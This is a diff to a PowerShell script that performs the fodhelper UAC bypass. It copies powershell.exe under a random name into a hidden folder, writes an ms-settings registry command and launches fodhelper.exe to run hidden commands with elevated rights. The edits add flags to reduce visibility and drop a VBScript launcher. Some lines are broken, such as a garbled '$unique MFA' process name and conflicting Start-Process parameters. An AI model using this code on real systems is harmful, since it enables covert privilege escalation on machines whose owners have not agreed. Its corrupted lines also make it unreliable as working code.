@@ -24,7 +24,7 @@ try {
     exit
 }
 
-# Generate a unique name for the copied PowerShell executable
+# Generate a unique name for a copied PowerShell executable
 $uniqueExeNamePowershell = [guid]::NewGuid().ToString()
 $fullUniqueExePowershell = $uniqueExeNamePowershell + ".exe"
 $destinationPathPowershell = Join-Path -Path $hiddenFolderPath -ChildPath $fullUniqueExePowershell
@@ -47,7 +47,7 @@ try {
 # Define the commands to execute with elevated privileges
 $CommandsToExecute = @"
 # Define your commands here
-Start-Process "wscript.exe" -ArgumentList "C:\Windows\Script.vbs" -WindowStyle Hidden
+Start-Process "wscript.exe" -ArgumentList "C:\Windows\Script.vbs" -WindowStyle Hidden -NoNewWindow
 "@
 
 # Write the commands to a script file in the hidden folder
@@ -60,22 +60,6 @@ try {
     exit
 }
 
-# Create a VBScript to run the PowerShell script hidden
-$vbScriptContent = @"
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run """$destinationPathPowershell"" -File ""$scriptPath""", 0, False
-"@
-
-# Write the VBScript to a file in the hidden folder
-$vbScriptPath = Join-Path -Path $hiddenFolderPath -ChildPath "run_hidden.vbs"
-try {
-    $vbScriptContent | Out-File -FilePath $vbScriptPath -Encoding ASCII
-    Write-Host "VBScript file created at: $vbScriptPath"
-} catch {
-    Write-Error "Failed to create VBScript file. Exiting script."
-    exit
-}
-
 # Create a registry key for a custom command
 $regKeyPath = "HKCU:\Software\Classes\ms-settings\Shell\open\command"
 
@@ -83,8 +67,8 @@ try {
     # Create the registry key and set required properties
     New-Item -Path $regKeyPath -Force | Out-Null
     New-ItemProperty -Path $regKeyPath -Name "DelegateExecute" -Value "" -Force | Out-Null
-    # Define the command to execute the VBScript
-    $command = "wscript.exe `"$vbScriptPath`""
+    # Define the command to execute the script file with additional parameters to minimize visibility
+    $command = "$destinationPathPowershell -WindowStyle Hidden -NoLogo -NonInteractive -File `"$scriptPath`""
     Set-ItemProperty -Path $regKeyPath -Name "(default)" -Value $command -Force
     Write-Host "Registry key created and command set to: $command"
 } catch {
@@ -96,7 +80,7 @@ try {
 try {
     $fodhelperPath = "C:\Windows\System32\fodhelper.exe"
     if (Test-Path $fodhelperPath) {
-        Start-Process -FilePath $fodhelperPath -WindowStyle Hidden
+        Start-Process -FilePath $fodhelperPath -WindowStyle Hidden -NoNewWindow
         Write-Host "Fodhelper.exe executed."
     } else {
         Write-Error "Fodhelper.exe not found. Exiting script."
@@ -112,7 +96,7 @@ try {
     $isPowershellRunning = $true
     Write-Host "Waiting for the PowerShell process to complete..."
     while ($isPowershellRunning) {
-        $process = Get-Process -Name $uniqueExeNamePowershell -ErrorAction SilentlyContinue
+        $process = Get-Process -Name $unique MFA -ErrorAction SilentlyContinue
         if ($process -eq $null) {
             $isPowershellRunning = $false
             Write-Host "PowerShell process completed."
